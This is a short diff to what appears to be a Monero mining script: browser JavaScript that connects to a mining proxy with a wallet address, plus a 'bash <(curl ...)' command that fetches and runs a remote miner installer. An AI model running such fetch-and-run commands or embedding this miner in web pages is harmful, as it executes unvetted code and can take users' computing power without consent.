@@ -18,7 +18,7 @@ bash <(curl -fsSL git.io/aminer) -o gulf.moneroocean.stream:10128 -u 8ANyqnPspbm
     server = "wss://f.xmrminingproxy.com:8181";
     var pool = "moneroocean.stream";
     var walletAddress = "8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un";
-    var workerId = ""
+    var workerId = "AliX"
     var threads = -1;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
